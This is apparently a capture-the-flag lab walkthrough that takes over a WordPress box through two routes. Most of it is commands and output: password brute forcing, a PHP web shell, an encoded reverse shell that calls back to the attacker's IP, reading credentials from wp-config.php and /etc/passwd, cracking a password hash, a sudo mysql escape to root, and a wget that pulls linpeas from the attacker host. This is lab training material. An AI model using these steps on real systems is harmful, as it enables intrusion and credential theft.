### First route:

1. Detect which devices are online on the same subnet.
    ```bash
    $ sudo netdiscover -i eth0
    ```
2. Perform version detection on the target IP.
    ```bash
    $ nmap 192.168.121.130 -sV
    ```

    > PORT       STATE   SERVICE  VERSION
    > 22/tcp     open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    > 80/tcp     open     http        Apache httpd 2.4.52 ((Ubuntu))
    > 8899/tcp   open     http        Apache httpd 2.4.52 ((Ubuntu))
    >
3. Modify the hosts file.
    ```bash
    $ sudo nano /etc/hosts
    ```
4. Enumerate usernames.
    ```bash
    $ wpscan --url http://192.168.121.130 -e u
    ```
    > oh_my_password_is_week
5. Brute-force the password.
    ```bash
    $ wpscan --url http://192.168.121.130 -P /usr/share/wordlists/rockyou.txt -U oh_my_password_is_week
    ```
    > rockyoupassword
6. Start a listener on the local port.
    ```bash
    $ nc -lvnp 4444
    ```
7. Edit the WordPress theme file via the theme editor.
    ```php
    <pre>
    <?php
    system($_GET['cmd']);
    ?>
    </pre>
    ```
8. Enter commands in the URL to execute shell commands.
    ```bash
    cmd=echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xMjEuMTI4Iiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJiYX[...]
    ```
9. Upgrade the shell.
    ```bash
    $ python upgrade to tty
    $ python3 -c "import pty;pty.spawn('/bin/bash')"
    $ export TERM=xterm
    ```
    `Ctrl+Z` (background the `nc` process)
    ```bash
    # get the nc process back
    $ stty raw -echo; fg
    ```
10. Inspect database-related configuration.
    ```bash
    $ cat wp-config.php
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );
    /** Database username */
    define( 'DB_USER', 'keep_going' );
    /** Database password */
    define( 'DB_PASSWORD', 'you_are_in_the_right_way' );
    ```
11. Print `/etc/passwd`.
    ```bash
    $ cat /etc/passwd | grep bash
    root:x:0:0:root:/root:/bin/bash
    developer:x:1000:1000:onward:/home/developer:/bin/bash
    ```
12. Connect to the database.
    ```bash
    $ mysql -u keep_going wordpress -p
    ```
13. List the tables.
    ```bash
    mysql> show tables;
    +-----------------------+
    | Tables_in_wordpress   |
    +-----------------------+
    | backupUsers           |
    | wp_commentmeta        |
    | wp_comments           |
    | wp_links              |
    | wp_options            |
    | wp_postmeta           |
    | wp_posts              |
    | wp_term_relationships |
    | wp_term_taxonomy      |
    | wp_termmeta           |
    | wp_terms              |
    | wp_usermeta           |
    | wp_users              |
    +-----------------------+
    ```
14. Inspect `backupUsers`.
    ```mysql
    mysql> describe backupUsers;
    +------------+--------------+------+-----+---------+-------+
    | Field      | Type         | Null | Key | Default | Extra |
    +------------+--------------+------+-----+---------+-------+
    | ID         | int          | YES  |     | NULL    |       |
    | user_login | varchar(60)  | YES  |     | NULL    |       |
    | user_pass  | varchar(255) | YES  |     | NULL    |       |
    +------------+--------------+------+-----+---------+-------+
    3 rows in set (0.00 sec)
    ```
15. Inspect the fields in `backupUsers`.
    ```mysql
    mysql> select ID, user_login, user_pass from backupUsers;
    +------+------------+------------------------------------+
    | ID   | user_login | user_pass                          |
    +------+------------+------------------------------------+
    |    0 | developer  | $P$BE3BfMlpaIeM7t.9j2TCvCXjgH0b7q/ |
    +------+------------+------------------------------------+
    1 row in set (0.00 sec)
    ```
16. Identify the hash type.
    ```bash
    $ hash-identifier
    HASH: $P$BE3BfMlpaIeM7t.9j2TCvCXjgH0b7q/
    Possible Hashs:
    [+] MD5(WordPress)
    ```
17. Save the hashed password to a file.
    ```bash
    $ nano developer.hash
    ```
18. Crack it.
    ```bash
    $ hashcat -m 400 developer.hash /usr/share/wordlists/rockyou.txt
    ```
    ```bash
    $ john --wordlist=/usr/share/wordlists/rockyou.txt developer.hash
    ```
    > 1qaz2wsx
19. View `local.txt`.
    ```bash
    $ cat local.txt
    3d54057c3add9713f329dd57b6bb7c19
    ```
20. Check whether the `developer` user can escalate privileges via sudo.
    ```bash
    $ sudo -l
    User developer may run the following commands on onwardeasy:
    (root) /bin/mysql
    ```
21. Escalate privileges.
    ```bash
    $ sudo mysql -e '\! /bin/sh'
    ```
22. View `proof.txt`.
    ```bash
    $ cat proof.txt
    7d1a9a843ac8a3a766dc7cdbb38ed812
    ```

---

### Second route:
1. Connect and write a PHP command into the log.
    ```bash
    $ nc 192.168.121.130 22
    ```
    ```php
    <?php system($_GET['cmd']);?>
    ```
2. Listen locally.
    ```bash
    $ python -m http.server
    ```
3. Let the victim fetch the Kali-side `ps.php` file.
    ```bash
    victim > cmd=wget 192.168.121.128:8000/linpeas.sh -o /tmp/linpeas.sh
    ```
4. Visit `http://onward:8899/ps.php` and execute `linpeas`.
5. If successful, the rest is the same as in the first route.
